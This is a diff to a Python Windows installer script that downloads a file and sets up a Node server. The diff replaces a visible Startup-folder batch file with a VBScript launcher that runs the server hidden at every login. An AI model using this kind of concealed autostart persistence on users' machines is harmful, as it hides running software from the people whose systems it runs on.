@@ -1,7 +1,6 @@
 import os
 import requests
 import platform
-import shutil
 
 if platform.system() == "Windows":
     print("installing on Windows")
@@ -36,10 +35,10 @@ def download_file(url, dest_folder, filename):
         return None
 
 def create_batch():
-    Content = """
-    @echo off
-    node serverwindows.js
-    """
+    Content = """@echo off
+cd /d "%~dp0"
+node serverwindows.js
+"""
 
     batch_file_path = os.path.join(TargetFolder, "start_server.bat")
     with open(batch_file_path, "w") as f:
@@ -49,10 +48,14 @@ def create_batch():
 def add_to_startup():
     startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
     batch_file_path = os.path.join(TargetFolder, "start_server.bat")
-    shortcut_path = os.path.join(startup_folder, "start_server.bat")
-
-    shutil.copy(batch_file_path, shortcut_path)
-    print(f"Added to startup: {shortcut_path}")
+    vbs_path = os.path.join(startup_folder, "start_server_launcher.vbs")
+    vbs_content = f"""Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) & "{batch_file_path}" & chr(34), 0, False
+Set WshShell = Nothing
+"""
+    with open(vbs_path, "w") as f:
+        f.write(vbs_content)
+    print(f"Created hidden startup launcher: {vbs_path}")
 
 if __name__ == "__main__":
     download_file(DownloadURL, TargetFolder, DownloadFileName)
